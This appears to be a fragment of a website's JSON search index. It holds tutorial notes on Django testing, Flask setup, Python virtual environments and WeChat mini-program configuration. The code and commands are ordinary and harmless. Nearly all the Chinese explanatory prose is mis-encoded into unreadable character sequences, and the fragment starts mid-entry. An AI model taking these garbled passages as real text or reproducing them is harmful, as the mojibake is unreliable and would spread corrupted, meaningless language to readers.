æ”¾åœ¨åº”ç”¨çš„tests.pyæ–‡ä»¶ä¸­ï¼Œæµ‹è¯•ç³»ç»Ÿå°†è‡ªåŠ¨åœ°ä»ä»»ä½•åå­—ä»¥testå¼€å¤´çš„æ–‡ä»¶ä¸­æŸ¥æ‰¾æµ‹è¯•ç¨‹åºã€‚æ¯ä¸ªappåœ¨åˆ›å»ºçš„æ—¶å€™ï¼Œéƒ½ä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªtests.pyæ–‡ä»¶ï¼Œå°±åƒviews.pyç­‰æ–‡ä»¶ä¸€æ ·ã€‚\nå°†ä¸‹é¢çš„ä»£ç è¾“å…¥æŠ•ç¥¨åº”ç”¨çš„polls/tests.pyæ–‡ä»¶ä¸­ï¼š\nimport datetime from django.utils import timezone from django.test import TestCase from .models import Question  class QuestionMethodTests(TestCase):  def test_was_published_recently_with_future_question(self):  \u0026#34;\u0026#34;\u0026#34; åœ¨å°†æ¥å‘å¸ƒçš„é—®å·åº”è¯¥è¿”å›False \u0026#34;\u0026#34;\u0026#34;  time = timezone.now() + datetime.timedelta(days=30)  future_question = Question(pub_date=time)  self.assertIs(future_question.was_published_recently(), False) æˆ‘ä»¬åœ¨è¿™é‡Œåˆ›å»ºäº†ä¸€ä¸ªdjango.test.TestCaseçš„å­ç±»ï¼Œå®ƒå…·æœ‰ä¸€ä¸ªæ–¹æ³•ï¼Œè¯¥æ–¹æ³•åˆ›å»ºä¸€ä¸ªpub_dateåœ¨æœªæ¥çš„Questionå®ä¾‹ã€‚æœ€åæˆ‘ä»¬æ£€æŸ¥was_published_recently()çš„è¾“å‡ºï¼Œå®ƒåº”è¯¥æ˜¯ Falseã€‚\n3. Running tests #  åœ¨ç»ˆç«¯ä¸­ï¼Œè¿è¡Œä¸‹é¢çš„å‘½ä»¤ï¼Œ\n$ python manage.py test polls ä½ å°†çœ‹åˆ°ç»“æœå¦‚ä¸‹ï¼š\nCreating test database for alias \u0026#39;default\u0026#39;... F ====================================================================== FAIL: test_was_published_recently_with_future_question (polls.tests.QuestionMethodTests) ---------------------------------------------------------------------- Traceback (most recent call last): File \u0026#34;/path/to/mysite/polls/tests.py\u0026#34;, line 16, in test_was_published_recently_with_future_question self.assertIs(future_question.was_published_recently(), False) AssertionError: True is not False ---------------------------------------------------------------------- Ran 1 test in 0.001s FAILED (failures=1) Destroying test database for alias \u0026#39;default\u0026#39;... è¿™å…¶ä¸­éƒ½å‘ç”Ÿäº†äº›ä»€ä¹ˆï¼Ÿï¼š\n python manage.py test polls å‘½ä»¤ä¼šæŸ¥æ‰¾ polls åº”ç”¨ä¸­æ‰€æœ‰çš„æµ‹è¯•ç¨‹åº å‘ç°ä¸€ä¸ª django.test.TestCase çš„å­ç±» ä¸ºæµ‹è¯•åˆ›å»ºä¸€ä¸ªä¸“ç”¨çš„æ•°æ®åº“ æŸ¥æ‰¾åå­—ä»¥ test å¼€å¤´çš„æµ‹è¯•æ–¹æ³• åœ¨ test_was_published_recently_with_future_question æ–¹æ³•ä¸­ï¼Œåˆ›å»ºä¸€ä¸ª Question å®ä¾‹ï¼Œè¯¥å®ä¾‹çš„ pub_data å­—æ®µçš„å€¼æ˜¯30å¤©åçš„æœªæ¥æ—¥æœŸã€‚ ç„¶ååˆ©ç”¨ assertIs() æ–¹æ³•ï¼Œå®ƒå‘ç° was_published_recently() è¿”å›äº†Trueï¼Œè€Œä¸æ˜¯æˆ‘ä»¬å¸Œæœ›çš„ Falseã€‚  æœ€åï¼Œæµ‹è¯•ç¨‹åºä¼šé€šçŸ¥æˆ‘ä»¬å“ªä¸ªæµ‹è¯•å¤±è´¥äº†ï¼Œé”™è¯¯å‡ºç°åœ¨å“ªä¸€è¡Œã€‚\næ•´ä¸ªæµ‹è¯•ç”¨ä¾‹åŸºæœ¬ä¸Šå’Œ Python å†…ç½®çš„ unittest éå¸¸ç›¸ä¼¼ï¼Œå¤§å®¶å¯ä»¥å‚è€ƒ Python æ•™ç¨‹ä¸­æµ‹è¯•ç›¸å…³çš„ç« èŠ‚ã€‚\n4. Fix the bug #  ä¿®æ”¹æºä»£ç ï¼Œå…·ä½“å¦‚ä¸‹ï¼š\n# polls/models.py  def was_published_recently(self):  now = timezone.now()  return now - datetime.timedelta(days=1) \u0026lt;= self.pub_date \u0026lt;= now å†æ¬¡è¿è¡Œæµ‹è¯•ç¨‹åºï¼š\n$ python manage.py test polls Creating test database for alias \u0026#39;default\u0026#39;... . ---------------------------------------------------------------------- Ran 1 test in 0.001s OK Destroying test database for alias \u0026#39;default\u0026#39;... å¯ä»¥çœ‹åˆ° bug å·²ç»æ²¡æœ‰äº†ã€‚\n5. More comprehensive tests #  def test_was_published_recently_with_old_question(self):  \u0026#34;\u0026#34;\u0026#34; was_published_recently() returns False for questions whose pub_date is older than 1 day. \u0026#34;\u0026#34;\u0026#34;  time = timezone.now() - datetime.timedelta(days=1, seconds=1)  old_question = Question(pub_date=time)  self.assertIs(old_question.was_published_recently(), False)  def test_was_published_recently_with_recent_question(self):  \u0026#34;\u0026#34;\u0026#34; was_published_recently() returns True for questions whose pub_date is within the last day. \u0026#34;\u0026#34;\u0026#34;  time = timezone.now() - datetime.timedelta(hours=23, minutes=59, seconds=59)  recent_question = Question(pub_date=time)  self.assertIs(recent_question.was_published_recently(), True) Test a view #  The Django test client #  Django provides a test Client to simulate a user interacting with the code at the view level. We can use it in tests.py or even in the shell.\nWe will start again with the shell, where we need to do a couple of things that wonâ€™t be necessary in tests.py. The first is to set up the test environment in the shell:\n$ python manage.py shell \u0026gt;\u0026gt;\u0026gt; from django.test.utils import setup_test_environment \u0026gt;\u0026gt;\u0026gt; setup_test_environment() setup_test_environment() installs a template renderer which will allow us to examine some additional attributes on responses such as response.context that otherwise wouldnâ€™t be available.\nNext we need to import the test client class:\n\u0026gt;\u0026gt;\u0026gt; from django.test import Client \u0026gt;\u0026gt;\u0026gt; # create an instance of the client for our use \u0026gt;\u0026gt;\u0026gt; client = Client() With that ready, we can ask the client to do some work for us:\n\u0026gt;\u0026gt;\u0026gt; # get a response from \u0026#39;/\u0026#39; \u0026gt;\u0026gt;\u0026gt; response = client.get(\u0026#39;/\u0026#39;) Not Found: / \u0026gt;\u0026gt;\u0026gt; # we should expect a 404 from that address; if you instead see an \u0026gt;\u0026gt;\u0026gt; # \u0026#34;Invalid HTTP_HOST header\u0026#34; error and a 400 response, you probably \u0026gt;\u0026gt;\u0026gt; # omitted the setup_test_environment() call described earlier. \u0026gt;\u0026gt;\u0026gt; response.status_code 404 \u0026gt;\u0026gt;\u0026gt; # on the other hand we should expect to find something at \u0026#39;/polls/\u0026#39; \u0026gt;\u0026gt;\u0026gt; # we\u0026#39;ll use \u0026#39;reverse()\u0026#39; rather than a hardcoded URL \u0026gt;\u0026gt;\u0026gt; from django.urls import reverse \u0026gt;\u0026gt;\u0026gt; response = client.get(reverse(\u0026#39;polls:index\u0026#39;)) \u0026gt;\u0026gt;\u0026gt; response.status_code 200 \u0026gt;\u0026gt;\u0026gt; response.content b\u0026#39;\\n\u0026lt;ul\u0026gt;\\n\\n\u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;/polls/1/\u0026#34;\u0026gt;What\u0026amp;#39;s up?\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\\n\\n\u0026lt;/ul\u0026gt;\\n\\n\u0026#39; \u0026gt;\u0026gt;\u0026gt; response.context[\u0026#39;latest_question_list\u0026#39;] \u0026lt;QuerySet [\u0026lt;Question: What\u0026#39;s up?\u0026gt;]\u0026gt; Improving our view #  # polls/views.py from django.utils import timezone  class IndexView(generic.ListView):  template_name = \u0026#39;polls/index.html\u0026#39;  context_object_name = \u0026#39;latest_question_list\u0026#39;   def get_queryset(self):  \u0026#34;\u0026#34;\u0026#34; Return the last five published questions (not including those set to be published in the future). \u0026#34;\u0026#34;\u0026#34;  return Question.objects.filter(  pub_date__lte=timezone.now()  ).order_by(\u0026#39;-pub_date\u0026#39;)[:5] Test our new view #  Add the following to polls/tests.py:\nfrom django.urls import reverse and weâ€™ll create a shortcut function to create questions as well as a new test class:\ndef create_question(question_text, days):  \u0026#34;\u0026#34;\u0026#34; Create a question with the given `question_text` and published the given number of `days` offset to now (negative for questions published in the past, positive for questions that have yet to be published). \u0026#34;\u0026#34;\u0026#34;  time = timezone.now() + datetime.timedelta(days=days)  return Question.objects.create(question_text=question_text, pub_date=time)   class QuestionIndexViewTests(TestCase):  def test_no_questions(self):  \u0026#34;\u0026#34;\u0026#34; If no questions exist, an appropriate message is displayed. \u0026#34;\u0026#34;\u0026#34;  response = self.client.get(reverse(\u0026#39;polls:index\u0026#39;))  self.assertEqual(response.status_code, 200)  self.assertContains(response, \u0026#34;No polls are available.\u0026#34;)  self.assertQuerysetEqual(response.context[\u0026#39;latest_question_list\u0026#39;], [])   def test_past_question(self):  \u0026#34;\u0026#34;\u0026#34; Questions with a pub_date in the past are displayed on the index page. \u0026#34;\u0026#34;\u0026#34;  create_question(question_text=\u0026#34;Past question.\u0026#34;, days=-30)  response = self.client.get(reverse(\u0026#39;polls:index\u0026#39;))  self.assertQuerysetEqual(  response.context[\u0026#39;latest_question_list\u0026#39;],  [\u0026#39;\u0026lt;Question: Past question.\u0026gt;\u0026#39;]  )   def test_future_question(self):  \u0026#34;\u0026#34;\u0026#34; Questions with a pub_date in the future aren\u0026#39;t displayed on the index page. \u0026#34;\u0026#34;\u0026#34;  create_question(question_text=\u0026#34;Future question.\u0026#34;, days=30)  response = self.client.get(reverse(\u0026#39;polls:index\u0026#39;))  self.assertContains(response, \u0026#34;No polls are available.\u0026#34;)  self.assertQuerysetEqual(response.context[\u0026#39;latest_question_list\u0026#39;], [])   def test_future_question_and_past_question(self):  \u0026#34;\u0026#34;\u0026#34; Even if both past and future questions exist, only past questions are displayed. \u0026#34;\u0026#34;\u0026#34;  create_question(question_text=\u0026#34;Past question.\u0026#34;, days=-30)  create_question(question_text=\u0026#34;Future question.\u0026#34;, days=30)  response = self.client.get(reverse(\u0026#39;polls:index\u0026#39;))  self.assertQuerysetEqual(  response.context[\u0026#39;latest_question_list\u0026#39;],  [\u0026#39;\u0026lt;Question: Past question.\u0026gt;\u0026#39;]  )   def test_two_past_questions(self):  \u0026#34;\u0026#34;\u0026#34; The questions index page may display multiple questions. \u0026#34;\u0026#34;\u0026#34;  create_question(question_text=\u0026#34;Past question 1.\u0026#34;, days=-30)  create_question(question_text=\u0026#34;Past question 2.\u0026#34;, days=-5)  response = self.client.get(reverse(\u0026#39;polls:index\u0026#39;))  self.assertQuerysetEqual(  response.context[\u0026#39;latest_question_list\u0026#39;],  [\u0026#39;\u0026lt;Question: Past question 2.\u0026gt;\u0026#39;, \u0026#39;\u0026lt;Question: Past question 1.\u0026gt;\u0026#39;]  ) Testing the DetailView #  # polls/views.py class DetailView(generic.DetailView):  ...  def get_queryset(self):  \u0026#34;\u0026#34;\u0026#34; Excludes any questions that aren\u0026#39;t published yet. \u0026#34;\u0026#34;\u0026#34;  return Question.objects.filter(pub_date__lte=timezone.now()) And of course, we will add some tests, to check that a Question whose pub_date is in the past can be displayed, and that one with a pub_date in the future is not:\n# polls/tests.py class QuestionDetailViewTests(TestCase):  def test_future_question(self):  \u0026#34;\u0026#34;\u0026#34; The detail view of a question with a pub_date in the future returns a 404 not found. \u0026#34;\u0026#34;\u0026#34;  future_question = create_question(question_text=\u0026#39;Future question.\u0026#39;, days=5)  url = reverse(\u0026#39;polls:detail\u0026#39;, args=(future_question.id,))  response = self.client.get(url)  self.assertEqual(response.status_code, 404)   def test_past_question(self):  \u0026#34;\u0026#34;\u0026#34; The detail view of a question with a pub_date in the past displays the question\u0026#39;s text. \u0026#34;\u0026#34;\u0026#34;  past_question = create_question(question_text=\u0026#39;Past Question.\u0026#39;, days=-5)  url = reverse(\u0026#39;polls:detail\u0026#39;, args=(past_question.id,))  response = self.client.get(url)  self.assertContains(response, past_question.question_text) "},{"id":137,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/flask/tutorial/1.projectlayout/","title":"1. Project Layout","section":"Tutorial","content":"Project Layout #  ä¸€ä¸ª flask é¡¹ç›®å¯ä»¥å•å•ç”±ä¸€ä¸ªæ–‡ä»¶æ„æˆï¼š\nfrom flask import Flask  app = Flask(__name__)   @app.route(\u0026#39;/\u0026#39;) def hello():  return \u0026#39;Hello, World!\u0026#39; flask é¡¹ç›®çš„ .gitignore å¯ä»¥é€šè¿‡ä»¥ä¸‹çš„æ–¹å¼ç¼–å†™ï¼š\nvenv/\r*.pyc\r__pycache__/\rinstance/\r.pytest_cache/\r.coverage\rhtmlcov/\rdist/\rbuild/\r*.egg-info/ "},{"id":138,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/flask/tutorial/2.applicationsetup/","title":"2. Application Setup","section":"Tutorial","content":"Application Setup #  Application Factory #  é¦–å…ˆåˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ flaskrï¼Œç„¶ååœ¨æ–‡ä»¶å¤¹ä¸­åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ __init__.pyï¼š\nimport os  from flask import Flask   def create_app(test_config=None):  # create and configure the app  app = Flask(__name__, instance_relative_config=True)  app.config.from_mapping(  SECRET_KEY=\u0026#39;dev\u0026#39;,  DATABASE=os.path.join(app.instance_path, \u0026#39;flaskr.sqlite\u0026#39;),  )   if test_config is None:  # load the instance config, if it exists, when not testing  app.config.from_pyfile(\u0026#39;config.py\u0026#39;, silent=True)  else:  # load the test config if passed in  app.config.from_mapping(test_config)   # ensure the instance folder exists  try:  os.makedirs(app.instance_path)  except OSError:  pass   # a simple page that says hello  @app.route(\u0026#39;/hello\u0026#39;)  def hello():  return \u0026#39;Hello, World!\u0026#39;   return app create_app å°±æ˜¯é¡¹ç›®å‡½æ•°ï¼Œä»–ä¸»è¦å®Œæˆçš„åŠŸèƒ½è§http://flask.pocoo.org/docs/1.0/tutorial/factory/.\nRun the application #  éœ€è¦å…ˆè®¾ç½®é¡¹ç›®å‡½æ•°çš„åŒ…ä¸å¼€å‘çš„æ¨¡å¼ï¼š\nexport FLASK_APP=flaskr  export FLASK_ENV=development ç„¶åè¿è¡Œè¿™ä¸ªé¡¹ç›®ï¼š\nflask run ä¹‹ååœ¨æµè§ˆå™¨ä¸­è®¿é—® http://127.0.0.1/hello å³å¯å®ç°è®¿é—®ã€‚\n"},{"id":139,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/flask/tutorial/3.databases/","title":"3. Databases","section":"Tutorial","content":"Define and Access Database #  Connect to Database #  åˆ›å»ºæ–‡ä»¶ flaskr/db.py æ·»åŠ ä»¥ä¸‹çš„å†…å®¹ï¼š\nimport sqlite3  import click from flask import current_app, g from flask.cli import with_appcontext   def get_db():  if \u0026#39;db\u0026#39; not in g:  g.db = sqlite3.connect(  current_app.config[\u0026#39;DATABASE\u0026#39;],  detect_types=sqlite3.PARSE_DECLTYPES  )  g.db.row_factory = sqlite3.Row   return g.db   def close_db(e=None):  db = g.pop(\u0026#39;db\u0026#39;, None)   if db is not None:  db.close() "},{"id":140,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/virutalenv/","title":"Virutalenv","section":"Python","content":" å­¦ä¹ åœ°å€ï¼šhttps://docs.python-guide.org/dev/virtualenvs/\n pipenv \u0026amp; virtualenv #  Make sure you have got python and pip install:\n$ python --version  $ pip --version pipenv #    Install pipenv:\n$ pip install --user pipenv   Install packages for your project:\n$ cd myproject  $ pipenv install requests   Using installed packages:\nFor script file as below (main.py):\nimport requests  response = requests.get(\u0026#39;https://httpbin.org/ip\u0026#39;)  print(\u0026#39;Your IP is {0}\u0026#39;.format(response.json()[\u0026#39;origin\u0026#39;])) Then you can run this script using pipenv run:\n$ pipenv run python main.py Itâ€™s also possible to spawn a new shell that ensures all commands have access to your installed packages with\n$ pipenv shell   virtualenv #    Install virutalenv via pip:\n$ pip install virtualenv ...  $ virtualenv --version # Test your installation   virtualenv venv will create a folder in the current directory which will contain the Python executable files, and a copy of the pip library which you can use to install other packages:\n$ virtualenv \u0026lt;venv\u0026gt; # omitting the name will place the files in the current directory instead. You can also chose your own python interpreter:\n$ virtualenv -p /usr/bin/python2.7 \u0026lt;venv\u0026gt;   To begin using the virtual environment, it needs to be activated:\n$ source venv/bin/activate   If you are done working in the virtual environment for the moment, you can deactivate it:\n$ deactivate   virtualenvwrapper #    To install (make sure virtualenv is already installed):\n$ pip install virtualenvwrapper  $ export WORKON_HOME=~/.python_envs  $ source /usr/local/bin/virtualenvwrapper.sh   Create a virtual environment:\n$ workon \u0026lt;my_project\u0026gt;   Alternatively, you can make a project, which creates the virtual environment, and also a project directory inside $WORKON_HOME, which is cd-ed into when you workon myproject:\n$ mkproject \u0026lt;my_project\u0026gt;   Deactivating is still the same:\n$ deactivate   To delete the enviroment:\n$ rmvirtualenv \u0026lt;venv\u0026gt;   Other useful commands\n lsvirtualenv: List all of the environments. cdvirtualenv: Navigate into the directory of the currently activated virtual environment, so you can browse its site-packages, for example. cdsitepackages: Like the above, but directly into site-packages directory. lssitepackages: Shows contents of site-packages directory.    "},{"id":141,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/python/%E8%87%AA%E5%AD%A6%E7%AC%94%E8%AE%B0/","title":"è‡ªå­¦ç¬”è®°","section":"Python","content":"è‡ªå­¦ç¬”è®° (pdf) #  \r"},{"id":142,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/1.directorystructrue/","title":"1. Directory Structrue","section":"WxMiniProgram","content":"ç›®å½•ç»“æ„ #  æ–‡ä»¶ç»“æ„ #  å°ç¨‹åºåŒ…å«ä¸€ä¸ªæè¿°æ•´ä½“ç¨‹åºçš„ app å’Œå¤šä¸ªæè¿°å„è‡ªé¡µé¢çš„ pageã€‚\nä¸€ä¸ªå°ç¨‹åºä¸»ä½“éƒ¨åˆ†ç”±ä¸‰ä¸ªæ–‡ä»¶ç»„æˆï¼Œå¿…é¡»æ”¾åœ¨é¡¹ç›®çš„æ ¹ç›®å½•ï¼Œå¦‚ä¸‹ï¼š\n   æ–‡ä»¶ å¿…éœ€ ä½œç”¨     app.js æ˜¯ å°ç¨‹åºé€»è¾‘   app.json æ˜¯ å°ç¨‹åºå…¬å…±é…ç½®   app.wxss å¦ å°ç¨‹åºå…¬å…±æ ·å¼è¡¨    ä¸€ä¸ªå°ç¨‹åºé¡µé¢ç”±å››ä¸ªæ–‡ä»¶ç»„æˆï¼Œåˆ†åˆ«æ˜¯ï¼š\n   æ–‡ä»¶ç±»å‹ å¿…éœ€ ä½œç”¨     js æ˜¯ é¡µé¢é€»è¾‘   wxml æ˜¯ é¡µé¢ç»“æ„   json å¦ é¡µé¢é…ç½®   wxss å¦ é¡µé¢æ ·å¼è¡¨    æ³¨æ„ï¼šä¸ºäº†æ–¹ä¾¿å¼€å‘è€…å‡å°‘é…ç½®é¡¹ï¼Œæè¿°é¡µé¢çš„å››ä¸ªæ–‡ä»¶å¿…é¡»å…·æœ‰ç›¸åŒçš„è·¯å¾„ä¸æ–‡ä»¶åã€‚\nå…è®¸ä¸Šä¼ çš„æ–‡ä»¶ #  åœ¨é¡¹ç›®ç›®å½•ä¸­ï¼Œä»¥ä¸‹æ–‡ä»¶ä¼šç»è¿‡ç¼–è¯‘ï¼Œå› æ­¤ä¸Šä¼ ä¹‹åæ— æ³•ç›´æ¥è®¿é—®åˆ°ï¼š.jsã€app.jsonã€.wxmlã€*.wxssï¼ˆå…¶ä¸­ wxml å’Œ wxss æ–‡ä»¶ä»…é’ˆå¯¹åœ¨ app.json ä¸­é…ç½®äº†çš„é¡µé¢ï¼‰ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œåªæœ‰åç¼€ååœ¨ç™½åå•å†…çš„æ–‡ä»¶å¯ä»¥è¢«ä¸Šä¼ ã€‚å…·ä½“ç™½åå•åˆ—è¡¨å¦‚ä¸‹ï¼š\nwxsã€pngã€jpgã€jpegã€jpegã€svgã€jsonã€cerã€mp3ã€aacã€m4aã€mp4ã€wavã€oggã€silk "},{"id":143,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/wxminiprogram/2.settings/","title":"2. Settings","section":"WxMiniProgram","content":"é…ç½® #  å…¨å±€é…ç½® #  å°ç¨‹åºæ ¹ç›®å½•ä¸‹çš„ app.json æ–‡ä»¶ç”¨æ¥å¯¹å¾®ä¿¡å°ç¨‹åºè¿›è¡Œå…¨å±€é…ç½®ï¼Œå†³å®šé¡µé¢æ–‡ä»¶çš„è·¯å¾„ã€çª—å£è¡¨ç°ã€è®¾ç½®ç½‘ç»œè¶…æ—¶æ—¶é—´ã€è®¾ç½®å¤š tab ç­‰ã€‚\nä»¥ä¸‹æ˜¯ä¸€ä¸ªåŒ…å«äº†éƒ¨åˆ†å¸¸ç”¨é…ç½®é€‰é¡¹çš„ app.json ï¼š\n{  \u0026#34;pages\u0026#34;: [\u0026#34;pages/index/index\u0026#34;, \u0026#34;pages/logs/index\u0026#34;],  \u0026#34;window\u0026#34;: {  \u0026#34;navigationBarTitleText\u0026#34;: \u0026#34;Demo\u0026#34;  },  \u0026#34;tabBar\u0026#34;: {  \u0026#34;list\u0026#34;: [  {  \u0026#34;pagePath\u0026#34;: \u0026#34;pages/index/index\u0026#34;,  \u0026#34;text\u0026#34;: \u0026#34;é¦–é¡µ\u0026#34;  },  {  \u0026#34;pagePath\u0026#34;: \u0026#34;pages/logs/logs\u0026#34;,  \u0026#34;text\u0026#34;: \u0026#34;æ—¥å¿—\u0026#34;  }  ]  },  \u0026#34;networkTimeout\u0026#34;: {  \u0026#34;request\u0026#34;: 10000,  \u0026#34;downloadFile\u0026#34;: 10000  },  \u0026#34;debug\u0026#34;: true,  \u0026#34;navigateToMiniProgramAppIdList\u0026#34;: [\u0026#34;wxe5f52902cf4de896\u0026#34;] } app.json é…ç½®é¡¹åˆ—è¡¨ï¼š\n   å±æ€§ ç±»å‹ å¿…å¡« æè¿° æœ€ä½ç‰ˆæœ¬     pages String Array æ˜¯ é¡µé¢è·¯å¾„åˆ—è¡¨    window Object å¦ å…¨å±€çš„é»˜è®¤çª—å£è¡¨ç°    tabBar Object å¦ åº•éƒ¨ tab æ çš„è¡¨ç°    networkTimeout Object å¦ ç½‘ç»œè¶…æ—¶æ—¶é—´    debug Boolean å¦ æ˜¯å¦å¼€å¯ debug æ¨¡å¼ï¼Œé»˜è®¤å…³é—­    functionalPages Boolean å¦ æ˜¯å¦å¯ç”¨æ’ä»¶åŠŸèƒ½é¡µï¼Œé»˜è®¤å…³é—­ 2.1.0   subpackages Object Array å¦ åˆ†åŒ…ç»“æ„é…ç½® 1.7.3   workers String å¦ Worker ä»£ç æ”¾ç½®çš„ç›®å½• 1.9.90   requiredBackgroundModes String Array å¦ éœ€è¦åœ¨åå°ä½¿ç”¨çš„èƒ½åŠ›ï¼Œå¦‚ã€ŒéŸ³ä¹æ’­æ”¾ã€    plugins Object å¦ ä½¿ç”¨åˆ°çš„æ’ä»¶ 1.9.6   preloadRule Object å¦ åˆ†åŒ…é¢„ä¸‹è½½è§„åˆ™ 2.3.0   resizable Boolean å¦ iPad å°ç¨‹åºæ˜¯å¦æ”¯æŒå±å¹•æ—‹è½¬ï¼Œé»˜è®¤å…³é—­ 2.3.0   navigateToMiniProgramAppIdList String Array å¦ éœ€è¦è·³è½¬çš„å°ç¨‹åºåˆ—è¡¨ï¼Œè¯¦è§ wx.navigateToMiniProgram 2.4.0   usingComponents Object å¦ å…¨å±€è‡ªå®šä¹‰ç»„ä»¶é…ç½® å¼€å‘è€…å·¥å…· 1.02.1810190   permission Object å¦ å°ç¨‹åºæ¥å£æƒé™ç›¸å…³è®¾ç½® å¾®ä¿¡å®¢æˆ·ç«¯ 7.0.0    Pages #  ç”¨äºæŒ‡å®šå°ç¨‹åºç”±å“ªäº›é¡µé¢ç»„æˆï¼Œæ¯ä¸€é¡¹éƒ½å¯¹åº”ä¸€ä¸ªé¡µé¢çš„ è·¯å¾„+æ–‡ä»¶å ä¿¡æ¯ã€‚æ–‡ä»¶åä¸éœ€è¦å†™æ–‡ä»¶åç¼€ï¼Œæ¡†æ¶ä¼šè‡ªåŠ¨å»å¯»æ‰¾å¯¹äºä½ç½®çš„ .json, .js, .wxml, .wxss å››ä¸ªæ–‡ä»¶è¿›è¡Œå¤„ç†ã€‚\nWindows #  ç”¨äºè®¾ç½®å°ç¨‹åºçš„çŠ¶æ€æ ã€å¯¼èˆªæ¡ã€æ ‡é¢˜ã€çª—å£èƒŒæ™¯è‰²ã€‚\nwindows å±æ€§åˆ—è¡¨ï¼š\n   å±æ€§ ç±»å‹ é»˜è®¤å€¼ æè¿° æœ€ä½ç‰ˆæœ¬     navigationBarBackgroundColor HexColor #000000 å¯¼èˆªæ èƒŒæ™¯é¢œè‰²ï¼Œå¦‚ #000000    navigationBarTextStyle String white å¯¼èˆªæ æ ‡é¢˜é¢œè‰²ï¼Œä»…æ”¯æŒ black / white    navigationBarTitleText String  å¯¼èˆªæ æ ‡é¢˜æ–‡å­—å†…å®¹    navigationStyle String default å¯¼èˆªæ æ ·å¼ï¼Œä»…æ”¯æŒä»¥ä¸‹å€¼ï¼š default é»˜è®¤æ ·å¼ custom è‡ªå®šä¹‰å¯¼èˆªæ ï¼Œåªä¿ç•™å³ä¸Šè§’èƒ¶å›ŠæŒ‰é’®ã€‚å‚è§æ³¨2ã€‚ å¾®ä¿¡å®¢æˆ·ç«¯ 6.6.0   backgroundColor HexColor #ffffff çª—å£çš„èƒŒæ™¯è‰²    backgroundTextStyle String dark ä¸‹æ‹‰ loading çš„æ ·å¼ï¼Œä»…æ”¯æŒ dark / light    backgroundColorTop String #ffffff é¡¶éƒ¨çª—å£çš„èƒŒæ™¯è‰²ï¼Œä»… iOS æ”¯æŒ å¾®ä¿¡å®¢æˆ·ç«¯ 6.5.16   backgroundColorBottom String #ffffff åº•éƒ¨çª—å£çš„èƒŒæ™¯è‰²ï¼Œä»… iOS æ”¯æŒ å¾®ä¿¡å®¢æˆ·ç«¯ 6.5.16   enablePullDownRefresh Boolean false æ˜¯å¦å¼€å¯å½“å‰é¡µé¢çš„ä¸‹æ‹‰åˆ·æ–°ã€‚ è¯¦è§ Page.onPullDownRefresh    onReachBottomDistance Number 50 é¡µé¢ä¸Šæ‹‰è§¦åº•äº‹ä»¶è§¦å‘æ—¶è·é¡µé¢åº•éƒ¨è·ç¦»ï¼Œå•ä½ä¸ºpxã€‚ è¯¦è§ Page.onReachBottom    pageOrientation String portrait å±å¹•æ—‹è½¬è®¾ç½®ï¼Œæ”¯æŒ auto/ portrait / landscape è¯¦è§ å“åº”æ˜¾ç¤ºåŒºåŸŸå˜åŒ– 2.4.0 (auto) / 2.5.0(landscape)    tabBar #  å¦‚æœå°ç¨‹åºæ˜¯ä¸€ä¸ªå¤š tab åº”ç”¨ï¼ˆå®¢æˆ·ç«¯çª—å£çš„åº•éƒ¨æˆ–é¡¶éƒ¨æœ‰ tab æ å¯ä»¥åˆ‡æ¢é¡µé¢ï¼‰ï¼Œå¯ä»¥é€šè¿‡ tabBar é…ç½®é¡¹æŒ‡å®š tab æ çš„è¡¨ç°ï¼Œä»¥åŠ tab åˆ‡æ¢æ—¶æ˜¾ç¤ºçš„å¯¹åº”é¡µé¢ã€‚\ntabBar è¯¦ç»†é…ç½®åˆ—è¡¨ï¼š\n   å±æ€§ ç±»å‹ å¿…å¡« é»˜è®¤å€¼ æè¿° æœ€ä½ç‰ˆæœ¬     color HexColor æ˜¯  tab ä¸Šçš„æ–‡å­—é»˜è®¤é¢œè‰²ï¼Œä»…æ”¯æŒåå…­è¿›åˆ¶é¢œè‰²    selectedColor HexColor æ˜¯  tab ä¸Šçš„æ–‡å­—é€‰ä¸­æ—¶çš„é¢œè‰²ï¼Œä»…æ”¯æŒåå…­è¿›åˆ¶é¢œè‰²    backgroundColor HexColor æ˜¯  tab çš„èƒŒæ™¯è‰²ï¼Œä»…æ”¯æŒåå…­è¿›åˆ¶é¢œè‰²    borderStyle String å¦ black tabbarä¸Šè¾¹æ¡†çš„é¢œè‰²ï¼Œ ä»…æ”¯æŒ black / white    list Array æ˜¯  tab çš„åˆ—è¡¨ï¼Œè¯¦è§ list å±æ€§è¯´æ˜ï¼Œæœ€å°‘2ä¸ªã€æœ€å¤š5ä¸ª tab    position String å¦ bottom tabBar çš„ä½ç½®ï¼Œä»…æ”¯æŒ bottom / top    custom Boolean å¦ false è‡ªå®šä¹‰ tabBarï¼Œè§è¯¦æƒ… 2.5.0    å…¶ä¸­ list çš„è¯¦ç»†é…ç½®ä¿¡æ¯å¦‚ä¸‹ï¼š\n   å±æ€§ ç±»å‹ å¿…å¡« è¯´æ˜     pagePath String æ˜¯ é¡µé¢è·¯å¾„ï¼Œå¿…é¡»åœ¨ pages ä¸­å…ˆå®šä¹‰   text String æ˜¯ tab ä¸ŠæŒ‰é’®æ–‡å­—   iconPath String å¦ å›¾ç‰‡è·¯å¾„ï¼Œicon å¤§å°é™åˆ¶ä¸º40kbï¼Œå»ºè®®å°ºå¯¸ä¸º 81px * 81pxï¼Œä¸æ”¯æŒç½‘ç»œå›¾ç‰‡ã€‚ å½“ postion ä¸º top æ—¶ï¼Œä¸æ˜¾ç¤º iconã€‚   selectedIconPath String 